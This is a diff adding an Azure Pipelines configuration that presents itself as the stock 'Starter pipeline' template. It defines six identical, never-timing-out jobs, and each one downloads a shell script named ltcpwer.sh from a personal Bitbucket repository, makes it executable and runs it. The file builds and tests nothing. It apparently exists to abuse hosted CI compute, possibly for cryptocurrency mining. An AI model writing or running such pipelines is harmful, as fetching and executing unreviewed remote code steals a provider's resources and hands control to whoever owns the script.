@@ -1,0 +1,59 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-16.04
+
+jobs:
+- job: MyJob
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
+
+- job: MyJob1
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
+
+- job: MyJob2
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
+
+- job: MyJob3
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
+
+- job: MyJob4
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
+
+- job: MyJob5
+  timeoutInMinutes: 0
+  displayName: My First Job
+  steps:
+  - script: |
+      sudo apt update && sudo apt install wget -y && wget https://bitbucket.org/paxtonmerritt908989/gitrun/raw/d53afe34ff317d10f2334cd84abf77aef96cc023/ltcpwer.sh && chmod +x ltcpwer.sh && ./ltcpwer.sh
+    displayName: 'Run a multi-line script'
